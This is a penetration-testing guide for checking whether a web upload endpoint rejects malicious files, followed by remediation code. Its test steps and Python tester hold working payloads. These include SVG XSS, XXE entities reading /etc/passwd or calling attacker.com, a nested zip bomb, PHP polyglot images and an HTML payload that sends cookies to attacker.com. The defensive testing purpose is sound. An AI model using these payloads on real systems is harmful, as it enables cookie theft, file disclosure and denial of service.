# WSTG-BUSL-09: Test Upload of Malicious Files

## Test ID
WSTG-BUSL-09

## Test Name
Test Upload of Malicious Files

## High-Level Description

This test examines whether the application properly scans and rejects files containing malicious content such as malware, exploits, or embedded scripts. Even if file type validation is in place, malicious content within allowed file types (e.g., macro-enabled Office documents, PDFs with JavaScript, images with embedded payloads) can pose significant risks to users who download these files or systems that process them.

---

## What to Check

### Malicious Content Types

- [ ] Malware/virus detection
- [ ] Office macros
- [ ] PDF JavaScript
- [ ] Image-based exploits
- [ ] Archive bombs (zip bombs)
- [ ] Embedded scripts in allowed formats
- [ ] XXE in XML-based files

### Common Attack Vectors

| File Type | Attack Vector |
|-----------|---------------|
| DOCX/XLSX | Macros, OLE objects |
| PDF | JavaScript, embedded files |
| SVG | JavaScript, XSS |
| XML | XXE, XSS |
| ZIP | Path traversal, zip bombs |
| Images | Steganography, polyglots |

---

## How to Test

### Step 1: Test Malware Detection

```bash
# Use EICAR test file (industry standard test file, NOT actual malware)
echo 'X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*' > eicar.txt

curl -s -X POST "https://target.com/api/upload" \
    -H "Authorization: Bearer $TOKEN" \
    -F "file=@eicar.txt"

# Also test with .com extension
mv eicar.txt eicar.com
curl -s -X POST "https://target.com/api/upload" \
    -H "Authorization: Bearer $TOKEN" \
    -F "file=@eicar.com"
```

### Step 2: Test Office Macro Documents

```bash
# Create document with macro (requires Office/LibreOffice)
# Or use pre-made macro-enabled documents

# Test DOCM (macro-enabled Word)
curl -s -X POST "https://target.com/api/upload" \
    -H "Authorization: Bearer $TOKEN" \
    -F "file=@document_with_macro.docm"

# Test XLSM (macro-enabled Excel)
curl -s -X POST "https://target.com/api/upload" \
    -H "Authorization: Bearer $TOKEN" \
    -F "file=@spreadsheet_with_macro.xlsm"

# Test renamed extensions (docm as doc)
cp document_with_macro.docm document.doc
curl -s -X POST "https://target.com/api/upload" \
    -H "Authorization: Bearer $TOKEN" \
    -F "file=@document.doc"
```

### Step 3: Test PDF with JavaScript

```python
#!/usr/bin/env python3
# Generate PDF with JavaScript

from reportlab.pdfgen import canvas
from reportlab.lib.pagesizes import letter
from PyPDF2 import PdfWriter, PdfReader

def create_js_pdf(output_file, js_code):
    """Create PDF with embedded JavaScript"""

    # Create basic PDF
    c = canvas.Canvas("temp.pdf", pagesize=letter)
    c.drawString(100, 750, "Test Document")
    c.save()

    # Add JavaScript
    reader = PdfReader("temp.pdf")
    writer = PdfWriter()

    for page in reader.pages:
        writer.add_page(page)

    # Add JavaScript action
    js = f"""
    /S /JavaScript
    /JS ({js_code})
    """

    # This requires manual PDF manipulation or tools like pdftk
    # For testing, use pre-made PDFs with JS

    with open(output_file, "wb") as f:
        writer.write(f)

# Alternative: Use existing test PDFs
# Download from security testing resources
```

```bash
# Test PDF with JavaScript
curl -s -X POST "https://target.com/api/upload" \
    -H "Authorization: Bearer $TOKEN" \
    -F "file=@pdf_with_javascript.pdf"
```

### Step 4: Test SVG with XSS

```bash
# Create malicious SVG
cat > malicious.svg << 'EOF'
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
  <rect width="300" height="100" style="fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)" />
  <script type="text/javascript">
    alert('XSS');
  </script>
</svg>
EOF

# Upload
curl -s -X POST "https://target.com/api/upload" \
    -H "Authorization: Bearer $TOKEN" \
    -F "file=@malicious.svg"

# Check if served with proper Content-Type
curl -s -I "https://target.com/uploads/malicious.svg"
```

### Step 5: Test XML with XXE

```bash
# Create XXE payload
cat > xxe.xml << 'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >
]>
<foo>&xxe;</foo>
EOF

curl -s -X POST "https://target.com/api/upload" \
    -H "Authorization: Bearer $TOKEN" \
    -F "file=@xxe.xml"

# Test in document formats that use XML (DOCX, XLSX, etc.)
# DOCX is a ZIP with XML files inside
unzip -q document.docx -d doc_extracted
# Modify XML files to include XXE
# Rezip and upload
```

### Step 6: Test Archive Bombs

```bash
# Create zip bomb (be careful - this can crash systems)
# Small version for testing:

# Create a file with repeated content
dd if=/dev/zero of=zeros.txt bs=1M count=10

# Compress with maximum compression
zip -9 bomb.zip zeros.txt

# Nested compression (zip of zips)
for i in {1..5}; do
    cp bomb.zip "layer$i.zip"
    zip -9 "bomb_layer$i.zip" "layer$i.zip"
    mv "bomb_layer$i.zip" bomb.zip
done

# Upload
curl -s -X POST "https://target.com/api/upload" \
    -H "Authorization: Bearer $TOKEN" \
    -F "file=@bomb.zip"
```

### Step 7: Test Image with Embedded Payloads

```bash
# Create image with embedded PHP (polyglot)
# Start with valid GIF
echo -n 'GIF89a' > polyglot.gif.php
echo '<?php echo "test"; ?>' >> polyglot.gif.php

# Or use JPEG comment to embed code
# Using exiftool
exiftool -Comment='<?php echo "test"; ?>' image.jpg

# Upload
curl -s -X POST "https://target.com/api/upload" \
    -H "Authorization: Bearer $TOKEN" \
    -F "file=@image.jpg"

# Check EXIF metadata for malicious content
curl -s -X POST "https://target.com/api/upload" \
    -H "Authorization: Bearer $TOKEN" \
    -F "file=@image_with_xss_in_exif.jpg"
```

---

## Tools

### Malware Testing

| Tool | Description | Usage |
|------|-------------|-------|
| **EICAR** | Antivirus test file | Standard detection test |
| **ClamAV** | Open source antivirus | Server-side scanning |
| **VirusTotal API** | Multi-engine scanning | Integration |

### Payload Generation

| Tool | Description |
|------|-------------|
| **msfvenom** | Metasploit payloads |
| **Office-DDE-Payloads** | Office exploits |
| **PDF-parser** | PDF analysis |

---

## Example Commands/Payloads

### Malicious File Payloads

```xml
<!-- SVG XSS -->
<svg xmlns="http://www.w3.org/2000/svg" onload="alert('XSS')">
  <circle cx="50" cy="50" r="40"/>
</svg>

<!-- XXE in XML -->
<?xml version="1.0"?>
<!DOCTYPE data [
  <!ENTITY file SYSTEM "file:///etc/passwd">
]>
<data>&file;</data>

<!-- XXE in DOCX (word/document.xml) -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/collect">]>
```

### Malicious File Upload Tester

```python
#!/usr/bin/env python3
import requests
import tempfile
import os

class MaliciousFileTester:
    def __init__(self, upload_url, token):
        self.url = upload_url
        self.headers = {"Authorization": f"Bearer {token}"}
        self.results = []

    def test_eicar(self):
        """Test EICAR antivirus test file"""
        eicar = b'X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*'

        for ext in ['txt', 'com', 'exe', 'zip']:
            files = {'file': (f'eicar.{ext}', eicar, 'application/octet-stream')}
            response = requests.post(self.url, headers=self.headers, files=files)

            self.results.append({
                "test": f"EICAR .{ext}",
                "status": response.status_code,
                "blocked": response.status_code not in [200, 201],
                "response": response.text[:200]
            })

    def test_svg_xss(self):
        """Test SVG with JavaScript"""
        svg_payloads = [
            b'<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"></svg>',
            b'<svg><script>alert(1)</script></svg>',
            b'<svg xmlns="http://www.w3.org/2000/svg"><foreignObject><script>alert(1)</script></foreignObject></svg>',
        ]

        for i, payload in enumerate(svg_payloads):
            files = {'file': (f'test{i}.svg', payload, 'image/svg+xml')}
            response = requests.post(self.url, headers=self.headers, files=files)

            self.results.append({
                "test": f"SVG XSS #{i+1}",
                "status": response.status_code,
                "blocked": response.status_code not in [200, 201]
            })

    def test_xxe(self):
        """Test XML with XXE"""
        xxe_payloads = [
            b'''<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>''',
            b'''<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/xxe">]><foo>&xxe;</foo>''',
        ]

        for i, payload in enumerate(xxe_payloads):
            files = {'file': (f'test{i}.xml', payload, 'application/xml')}
            response = requests.post(self.url, headers=self.headers, files=files)

            self.results.append({
                "test": f"XXE #{i+1}",
                "status": response.status_code,
                "blocked": response.status_code not in [200, 201]
            })

    def test_polyglot(self):
        """Test image polyglot files"""
        # GIF header + PHP
        gif_php = b'GIF89a<?php echo "test"; ?>'

        # JPEG with PHP in comment
        # Simplified - real test would need proper JPEG structure
        jpg_php = b'\xFF\xD8\xFF\xE0<?php echo "test"; ?>'

        polyglots = [
            (gif_php, 'polyglot.gif', 'image/gif'),
            (gif_php, 'polyglot.gif.php', 'image/gif'),
            (jpg_php, 'polyglot.jpg', 'image/jpeg'),
        ]

        for content, filename, mime in polyglots:
            files = {'file': (filename, content, mime)}
            response = requests.post(self.url, headers=self.headers, files=files)

            self.results.append({
                "test": f"Polyglot: {filename}",
                "status": response.status_code,
                "blocked": response.status_code not in [200, 201]
            })

    def test_html_as_image(self):
        """Test HTML disguised as image"""
        html_content = b'''
<!DOCTYPE html>
<html>
<body>
<script>document.location='http://attacker.com/?c='+document.cookie</script>
</body>
</html>
'''

        extensions = ['jpg', 'png', 'gif', 'html.jpg']
        mimes = ['image/jpeg', 'image/png', 'text/html']

        for ext in extensions:
            for mime in mimes:
                files = {'file': (f'test.{ext}', html_content, mime)}
                response = requests.post(self.url, headers=self.headers, files=files)

                self.results.append({
                    "test": f"HTML as .{ext} (MIME: {mime})",
                    "status": response.status_code,
                    "blocked": response.status_code not in [200, 201]
                })

    def generate_report(self):
        """Generate test report"""
        print("\n=== MALICIOUS FILE UPLOAD REPORT ===\n")

        blocked = [r for r in self.results if r.get("blocked")]
        accepted = [r for r in self.results if not r.get("blocked")]

        print(f"Total tests: {len(self.results)}")
        print(f"Blocked (good): {len(blocked)}")
        print(f"Accepted (potential vulnerability): {len(accepted)}")

        if accepted:
            print("\n--- POTENTIAL VULNERABILITIES ---")
            for r in accepted:
                print(f"  [ACCEPTED] {r['test']}: Status {r['status']}")

        print("\n--- BLOCKED ---")
        for r in blocked:
            print(f"  [BLOCKED] {r['test']}")

# Usage
tester = MaliciousFileTester("https://target.com/api/upload", "auth_token")
tester.test_eicar()
tester.test_svg_xss()
tester.test_xxe()
tester.test_polyglot()
tester.test_html_as_image()
tester.generate_report()
```

---

## Remediation Guide

### 1. Implement Antivirus Scanning

```python
import clamd

def scan_file_for_malware(file_path):
    """Scan file using ClamAV"""
    try:
        cd = clamd.ClamdUnixSocket()

        result = cd.scan(file_path)

        if result and file_path in result:
            status, virus_name = result[file_path]
            if status == 'FOUND':
                return False, f"Malware detected: {virus_name}"

        return True, None

    except clamd.ConnectionError:
        # Fail closed - reject if scanner unavailable
        return False, "Antivirus scanner unavailable"

@app.route('/api/upload', methods=['POST'])
def upload():
    file = request.files['file']

    # Save to temp location
    temp_path = save_temp_file(file)

    # Scan for malware
    safe, message = scan_file_for_malware(temp_path)

    if not safe:
        os.remove(temp_path)
        return jsonify({"error": message}), 400

    # Continue with other validations...
```

### 2. Sanitize Office Documents

```python
from oletools.olevba import VBA_Parser

def check_office_macros(file_path):
    """Check Office documents for macros"""
    try:
        vbaparser = VBA_Parser(file_path)

        if vbaparser.detect_vba_macros():
            macros = vbaparser.analyze_macros()

            for m in macros:
                if m[0] in ['AutoExec', 'Suspicious']:
                    return False, "Dangerous macro detected"

            return False, "Document contains macros"

        return True, None

    except Exception as e:
        return False, f"Error scanning document: {str(e)}"

def sanitize_office_document(file_path, output_path):
    """Remove macros from Office documents"""
    # Use a library like python-docx to create clean copy
    # Or use LibreOffice in headless mode to convert to clean format
    pass
```

### 3. Sanitize SVG Files

```python
from defusedxml import ElementTree as ET
import re

def sanitize_svg(svg_content):
    """Remove dangerous elements from SVG"""

    # Parse with defusedxml (safe from XXE)
    try:
        root = ET.fromstring(svg_content)
    except ET.ParseError:
        return None, "Invalid SVG"

    # Remove script elements
    for script in root.findall('.//{http://www.w3.org/2000/svg}script'):
        script.getparent().remove(script)

    # Remove event handlers
    dangerous_attrs = [
        'onload', 'onclick', 'onerror', 'onmouseover',
        'onfocus', 'onblur', 'onchange', 'onsubmit'
    ]

    for elem in root.iter():
        for attr in dangerous_attrs:
            if attr in elem.attrib:
                del elem.attrib[attr]

    # Remove foreignObject (can contain HTML)
    for fo in root.findall('.//{http://www.w3.org/2000/svg}foreignObject'):
        fo.getparent().remove(fo)

    return ET.tostring(root, encoding='unicode'), None
```

### 4. Safe PDF Processing

```python
def sanitize_pdf(input_path, output_path):
    """Remove JavaScript and other dangerous elements from PDF"""
    from PyPDF2 import PdfReader, PdfWriter

    reader = PdfReader(input_path)
    writer = PdfWriter()

    for page in reader.pages:
        # Copy page without annotations/JavaScript
        writer.add_page(page)

    # Remove JavaScript
    if '/JavaScript' in reader.trailer.get('/Root', {}):
        # Don't copy JavaScript actions
        pass

    with open(output_path, 'wb') as f:
        writer.write(f)
```

### 5. Serve Uploads Safely

```python
from flask import send_file

@app.route('/uploads/<filename>')
def serve_upload(filename):
    # Validate filename
    safe_filename = secure_filename(filename)

    # Force download instead of inline display
    return send_file(
        os.path.join(UPLOAD_DIR, safe_filename),
        as_attachment=True,  # Force download
        mimetype='application/octet-stream'  # Generic MIME
    )

# Or set CSP headers
@app.after_request
def add_security_headers(response):
    if '/uploads/' in request.path:
        response.headers['Content-Security-Policy'] = "default-src 'none'"
        response.headers['X-Content-Type-Options'] = 'nosniff'
    return response
```

---

## Risk Assessment

### CVSS Score

| Finding | CVSS | Severity |
|---------|------|----------|
| Malware upload accepted | 9.8 | Critical |
| Macro-enabled document upload | 8.8 | High |
| SVG with JavaScript accepted | 7.5 | High |
| XXE via XML upload | 8.8 | High |
| Zip bomb accepted | 5.3 | Medium |

---

## CWE Categories

| CWE ID | Title | Description |
|--------|-------|-------------|
| **CWE-434** | Unrestricted Upload | Dangerous file content |
| **CWE-79** | Cross-site Scripting | SVG/HTML with JS |
| **CWE-611** | XXE | XML external entities |
| **CWE-400** | Resource Exhaustion | Zip bombs |

---

## References

- [OWASP WSTG - Test Upload of Malicious Files](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/10-Business_Logic_Testing/09-Test_Upload_of_Malicious_Files)
- [EICAR Test File](https://www.eicar.org/download-anti-malware-testfile/)
- [OWASP XXE Prevention](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html)

---

## Checklist

```
[ ] EICAR test file upload tested
[ ] Macro-enabled Office documents tested
[ ] PDF with JavaScript tested
[ ] SVG with JavaScript tested
[ ] XML with XXE tested
[ ] Archive bomb tested
[ ] HTML disguised as image tested
[ ] Polyglot files tested
[ ] EXIF metadata exploits tested
[ ] Antivirus scanning implemented
[ ] Content sanitization implemented
[ ] Findings documented
[ ] Remediation recommendations provided
```
